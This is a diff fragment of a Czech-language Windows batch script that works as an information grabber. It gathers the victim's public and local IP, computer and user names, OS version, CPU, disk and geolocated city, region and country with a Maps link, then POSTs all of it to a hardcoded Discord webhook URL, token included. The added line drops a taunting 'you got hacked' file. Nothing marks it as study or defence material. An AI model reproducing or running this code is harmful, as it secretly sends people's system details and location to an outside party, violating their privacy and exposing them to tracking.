@@ -96,3 +96,4 @@ set COUNTRY=!COUNTRY:ě=e!
 set MAP_URL=https://www.google.com/maps?q=!CITY!,!REGION!,!COUNTRY!
 
 curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"Verejna IP: %IP%\nLokalni IP: %LOCAL_IP%\nPocitac: %PC_NAME%\nUzivatel: %USER_NAME%\nWindows: %WIN_VERSION%\nCPU: %CPU%\nDisk: %DISK%\nMesto: !CITY!\nRegion: !REGION!\nZeme: !COUNTRY!\nOdkaz na mapy: !MAP_URL!\"}" "https://discordapp.com/api/webhooks/1356655194666045492/aRZhNAvhI2VBFl-m0ytbNf8su-y6G7LsqONVGI1sTN42O2cYTsZQtqA8DaR2aFUDjUkN"
+echo xd brasko jsi coocked > byljsihacknut.hack
